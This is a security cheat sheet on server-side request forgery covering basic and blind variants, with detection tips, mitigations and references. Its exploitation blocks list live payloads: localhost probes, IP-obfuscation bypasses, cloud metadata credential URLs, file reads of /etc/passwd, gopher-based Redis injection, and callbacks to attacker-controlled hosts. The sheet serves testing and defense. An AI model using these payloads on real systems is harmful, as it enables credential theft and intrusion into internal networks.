# Server-Side Request Forgery (SSRF)

SSRF occurs when the server makes HTTP requests to URLs supplied by the user — allowing
the attacker to probe internal networks, read cloud metadata, or attack internal services
that are not exposed to the internet.

---

## Basic SSRF (Internal Port Scan / File Read)

**Category:** SSRF / Internal Network Access
**Severity context:** High to Critical — pivot into internal infrastructure.

### How to identify it
Look for features where the server fetches a URL on your behalf: webhook callbacks,
URL previews, link-expander tools, PDF generators, image downloaders, proxy services,
API gateway forwarding, or social media share previews. Submit a known external URL
first to confirm the feature works, then try internal addresses.

### How it works
The application takes a URL from user input and makes an HTTP (or other protocol)
request to that URL using libraries like `curl`, `file_get_contents()`, `requests`,
`HttpURLConnection`, etc. If the input is not restricted to an allow-list, you can
point the server at internal hosts (127.0.0.1, 10.x.x.x, 172.x.x.x, 192.168.x.x) or
special URLs (`file:///`, `gopher://`).

### Exploitation
```bash
# Probe localhost services
?url=http://127.0.0.1:80
?url=http://127.0.0.1:8080
?url=http://127.0.0.1:3306

# CIDR notation
?url=http://127.0.0.1:8080
?url=http://0x7f000001:8080           # hex IP bypass
?url=http://2130706433:8080           # decimal IP bypass
?url=http://0x7f.0x00.0x00.0x01      # dotted hex

# DNS rebinding — register a domain that alternates between your server and 127.0.0.1
# Use rbndr.us or similar service

# Redirect bypass — host a redirect from your server to internal
# Your server at http://attacker.com/redirect returns 302 Location: http://169.254.169.254/latest/meta-data/

# AWS / GCP / Azure metadata endpoint
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/user-data/
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
  -H "Metadata-Flavor: Google"

# File protocol (if supported)
?url=file:///etc/passwd
?url=file:///var/www/html/index.php

# Gopher protocol — talk to raw TCP services (Redis, SMTP, MySQL)
?url=gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aauth%0d%0a$...   # Redis command injection

# Blind SSRF detection — Burp Collaborator / external listener
?url=http://attacker.burpcollaborator.net
```

### Example
```
Vulnerable endpoint:  POST /fetch-url  {"url": "http://example.com"}
Payload:              POST /fetch-url  {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"}
Response:             Returns AWS temporary credentials with full API access.
```

### Mitigation
Use an allow-list of permitted domains (never a deny-list). Block access to private IP
ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.169.254/32).
Use a dedicated URL parser that validates the scheme (disallow `file://`, `gopher://`,
`dict://`). Disable redirect following if not needed, otherwise validate the final URL
after redirects.

### References
- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP: SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)

---

## Blind SSRF (Out-of-Band)

**Category:** SSRF (Blind)
**Severity context:** High — no data returned in response, but can confirm via callback
and potentially exploit internal services.

### How to identify it
Same endpoints as basic SSRF, but the response doesn't include the fetched content. You
must detect SSRF by observing an outbound request from the server (DNS, HTTP) to a
listener you control.

### How it works
The server fetches the URL but only uses it internally (e.g. for validation, thumbnail
generation in the background). You don't see the response, but the server still makes
the request — which you can observe via DNS logs, HTTP server logs, or timing.

### Exploitation
```bash
# DNS-based detection (no HTTP server needed — DNS queries are almost never blocked)
?url=http://unique-id.burpcollaborator.net
?url=http://attacker.com/
# Check your DNS logs for the lookup

# Time-based detection (if server hits a slow endpoint)
?url=http://127.0.0.1:99999/  # connection timeout takes several seconds
?url=http://127.0.0.1:22      # fast — SSH is open
?url=http://127.0.0.1:9999    # slow — timeout

# Shellshock via SSRF (if CGI enabled)
?url=http://127.0.0.1/cgi-bin/test.cgi
  # With header injection to trigger Shellshock

# Internal service exploitation (blind)
# If the server has a vulnerable Redis at 127.0.0.1:6379, use gopher to inject commands
# Even without seeing the response, you can write an SSH key or create a cron job
```

### Mitigation
Same as basic SSRF. Additionally, block egress DNS and HTTP to the internet from the
application server unless explicitly needed. Use a forward proxy with an allow-list.

### References
- [PortSwigger: Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
- [HackerOne: SSRF best practices](https://www.hackerone.com/application-security/how-to-server-side-request-forgery-ssrf)
